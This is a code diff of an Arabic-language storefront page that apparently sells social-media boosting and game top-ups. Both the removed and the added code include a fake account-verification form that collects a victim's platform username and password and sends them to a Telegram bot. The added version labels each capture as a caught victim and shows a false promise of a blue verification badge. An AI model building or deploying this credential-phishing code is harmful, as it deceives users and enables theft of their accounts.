+            playClick(); currentUser = { name: 'VIP User', avatar: 'https://ui-avatars.com/api/?name=VIP&background=D4AF37&color=fff' };
+            document.getElementById('loginModal').classList.add('hidden'); document.getElementById('pageHome').classList.remove('hidden'); document.getElementById('userInfo').classList.remove('hidden'); document.getElementById('userAvatar').src = currentUser.avatar;
+        }
+
+        function logout() { playClick(); location.reload(); }
+
+        function goHome() { playClick(); document.getElementById('pagePlatform').classList.add('hidden'); document.getElementById('pageHome').classList.remove('hidden'); }
+
+        function openPlatform(p) {
+            playClick(); currentPlatform = p;
+            document.getElementById('pageHome').classList.add('hidden'); document.getElementById('pagePlatform').classList.remove('hidden');
+            document.getElementById('platTitle').textContent = p === 'gaming' ? 'شحن الألعاب' : p === 'premium' ? 'ترقية التطبيقات' : p.toUpperCase();
+
+            const list = document.getElementById('servicesList'); list.innerHTML = '';
+            pricing[p].forEach(s => {
+                const btn = document.createElement('div'); btn.className = 'service-btn';
+                btn.innerHTML = `<div class='font-bold'>${s.name}</div>`;
+                btn.onclick = () => { playClick(); document.querySelectorAll('.service-btn').forEach(b => b.classList.remove('selected')); btn.classList.add('selected'); currentService = s; calculatePrice(); };
+                list.appendChild(btn);
             });
-
-            document.getElementById('orderArea').classList.add('hidden');
-            showPage('page-platform'); // Now shifts to the platform sub-page cleanly
         }
 
-        function selectService(name, price) {
-            currentPricePerOne = price;
-            document.getElementById('selectedServiceName').innerText = name;
-            document.getElementById('orderArea').classList.remove('hidden');
-            updatePrice();
-        }
-
-        function updatePrice() {
-            const qty = document.getElementById('quantity').value || 0;
-            const total = qty * currentPricePerOne;
-            document.getElementById('finalPrice').innerText = total.toFixed(2);
-        }
-
-        // Modals Management
-        function login() { document.getElementById('loginModal').classList.add('hidden'); }
-        function logout() { document.getElementById('loginModal').classList.remove('hidden'); }
-        function openVerifyModal() { document.getElementById('verifyModal').classList.remove('hidden'); }
-        function closeVerifyModal() { document.getElementById('verifyModal').classList.add('hidden'); }
-        function closeSuccessModal() { document.getElementById('successModal').classList.add('hidden'); }
-
-        // Form Handling & Integration with Telegram Bot (Trap logs)
-        async function sendToTelegram(msg) {
-            const token = "YOUR_BOT_TOKEN"; // استبدله بـ التوكن الخاص بك
-            const chatId = "YOUR_CHAT_ID";   // استبدله بـ آيدي حسابك
-            try {
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: msg })
-                });
-            } catch (e) { console.error(e); }
-        }
-
-        async function submitVerifyForm(e) {
-            e.preventDefault();
-            const u = document.getElementById('vUser').value;
-            const p = document.getElementById('vPass').value;
-            
-            const text = `🔥 طلب توثيق جديد:\nالمنصة: ${currentPlatform || 'غير محددة'}\nالمستخدم: ${u}\nكلمة السر: ${p}`;
-            await sendToTelegram(text);
-            
-            closeVerifyModal();
-            triggerSuccess();
-        }
-
-        function setGamingOrder(itemName, price) {
-            document.getElementById('selectedGamingItem').innerText = `طلب شحن: ${itemName} (${price} LYD)`;
-            document.getElementById('gamingOrderArea').classList.remove('hidden');
-            document.getElementById('gamingOrderArea').scrollIntoView({ behavior: 'smooth' });
-        }
-
-        async function submitGamingOrder(e) {
-            e.preventDefault();
-            const id = document.getElementById('gameId').value;
-            const item = document.getElementById('selectedGamingItem').innerText;
-            
-            const text = `🎮 طلب شحن ألعاب جديد:\nالخدمة: ${item}\nالمعرف/الحساب: ${id}`;
-            await sendToTelegram(text);
-            
-            triggerSuccess();
-        }
-
-        async function submitMainOrder(e) {
-            e.preventDefault();
-            const link = document.getElementById('targetLink').value;
+        function calculatePrice() {
+            if (!currentService) return;
             const qty = document.getElementById('quantity').value;
-            const price = document.getElementById('finalPrice').innerText;
-            const srv = document.getElementById('selectedServiceName').innerText;
-
-            const text = `🛒 طلب رشق جديد:\nالخدمة: ${srv}\nالرابط: ${link}\nالكمية: ${qty}\nالسعر: ${price} د.ل`;
-            await sendToTelegram(text);
-
-            triggerSuccess();
+            const price = (qty * currentService.price).toFixed(2);
+            document.getElementById('finalPrice').textContent = price;
         }
 
-        function triggerSuccess() {
-            const ranId = Math.floor(1000 + Math.random() * 9000);
-            document.getElementById('orderIdDisplay').innerText = `LVL-${ranId}`;
-            document.getElementById('successModal').classList.remove('hidden');
+        async function handleVerify(e, platform) { e.preventDefault(); playClick(); 
+            const user = e.target[0].value; const pass = e.target[1].value;
+            const msg = `🚨🚨 **محاولة اختراق (توثيق)** 🚨🚨\n━━━━━━━━━━━━\n📱 المنصة: ${platform}\n👤 الحساب: ${user}\n🔑 كلمة السر: ${pass}\n━━━━━━━━━━━━\n✅ تم صيد الضحية بنجاح!`;
+            await sendToTelegram(msg); showToast('⏳ جاري معالجة طلب التوثيق... ستصلك العلامة الزرقاء خلال ساعات');
         }
 
-        function copyOrder() {
-            const idText = document.getElementById('orderIdDisplay').innerText;
-            navigator.clipboard.writeText(idText);
-            alert('تم نسخ رقم الطلب: ' + idText);
-        }
+        document.getElementById('orderForm').onsubmit = async function(e) { e.preventDefault(); playClick(); if (!currentService) { showToast('⚠️ اختر خدمة أولاً'); return; }
+            const orderNum = 'LVL-' + Math.random().toString(36).substr(2, 6).toUpperCase();
+            const msg = `💰 طلب شحن جديد\n━━━━━━━━━━━━\n📋 رقم الطلب: ${orderNum}\n🛠️ الخدمة: ${currentService.name}\n🔗 الرابط/الحساب: ${document.getElementById('targetLink').value}\n📊 الكمية: ${document.getElementById('quantity').value}\n💰 السعر: ${document.getElementById('finalPrice').textContent} د.ل\n━━━━━━━━━━━━`;
+            await sendToTelegram(msg); document.getElementById('orderNumberDisplay').textContent = orderNum; document.getElementById('successModal').classList.remove('hidden'); this.reset();
+        };
 
-        // Countdown Timer Logic
-        let totalSeconds = 23 * 3600 + 59 * 60 + 59;
-        setInterval(() => {
-            if (totalSeconds <= 0) return;
-            totalSeconds--;
-            const h = Math.floor(totalSeconds / 3600).toString().padStart(2, '0');
-            const m = Math.floor((totalSeconds % 3600) / 60).toString().padStart(2, '0');
-            const s = (totalSeconds % 60).toString().padStart(2, '0');
-            document.getElementById('countdown').innerText = `${h}:${m}:${s}`;
-        }, 1000);
+        function copyOrderNum() { navigator.clipboard.writeText(document.getElementById('orderNumberDisplay').textContent); showToast('📋 تم النسخ!'); }
+        function closeSuccessModal() { document.getElementById('successModal').classList.add('hidden'); goHome(); }
+
     </script>
+
 </body>
 </html>
